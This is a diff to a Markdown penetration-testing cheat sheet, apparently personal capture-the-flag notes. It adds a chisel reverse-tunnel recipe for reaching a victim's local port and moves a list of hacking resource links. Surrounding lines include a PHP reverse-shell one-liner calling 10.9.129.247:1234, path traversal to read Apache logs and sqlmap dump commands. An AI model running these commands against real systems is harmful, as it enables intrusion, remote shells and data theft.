@@ -25,13 +25,13 @@
 	- [List SUID files](#list-suid-files)
 	- [List writable folders](#list-writable-folders)
 	- [List of executable binaries](#list-of-executable-binaries)
+	- [Netcat](#netcat)
 - [Password Hack](#password-hack)
 	- [Hydra](#hydra)
 	- [JohnTheRipper](#johntheripper)
 	- [Hashcat](#hashcat)
 - [Steganography](#steganography)
 - [SQLMAP](#sqlmap)
-- [Websites](#websites)
 - [pwncat](#pwncat)
 	- [track modifications](#track-modifications)
 - [Wifite](#wifite)
@@ -44,6 +44,7 @@
 	- [View php code](#view-php-code)
 	- [View access.log](#view-accesslog)
 	- [Command injection](#command-injection)
+- [Websites](#websites)
 
 <!-- /MarkdownTOC -->
 
@@ -180,6 +181,25 @@ find / -type d -writable 2> /dev/null
 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null
 ```
 
+### Netcat
+```sh
+netcat -l
+```
+If 127.0.0.1:6666
+
+On attacker
+```sh
+apt-get install chisel
+# Copy chisel to victim
+chisel server --reverse --port 9002
+```
+On victim
+```sh
+./chisel client 10.9.129.247:9002 R:9001:127.0.0.1:6666
+```
+On attacker, go to `localhost:9001`
+
+
 ## Password Hack
 ### Hydra
 ```sh
@@ -227,15 +247,6 @@ sqlmap.py -u "http://www.truc.com/index.php" --form
 sqlmap.py -u "http://www.truc.com/index.php" --data "[post data]"
 sqlmap.py -u "http://www.truc.com/index.php" --data "[post data]" --dump
 ```
-
-## Websites
-* https://crackstation.net/
-* https://gchq.github.io/CyberChef/
-* http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-* https://github.com/internetwache/GitTools
-* https://hashes.com/en/decrypt/hash
-* https://md5decrypt.net/en/
-* https://github.com/swisskyrepo/PayloadsAllTheThings
 
 ## pwncat
 ```sh
@@ -327,6 +338,15 @@ GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apa
 ```
 php -r '$sock=fsockopen("10.9.129.247",1234);exec("/bin/sh -i <&3 >&3 2>&3");
 ```
+
+## Websites
+* https://crackstation.net/
+* https://gchq.github.io/CyberChef/
+* http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+* https://github.com/internetwache/GitTools
+* https://hashes.com/en/decrypt/hash
+* https://md5decrypt.net/en/
+* https://github.com/swisskyrepo/PayloadsAllTheThings
 
 
 
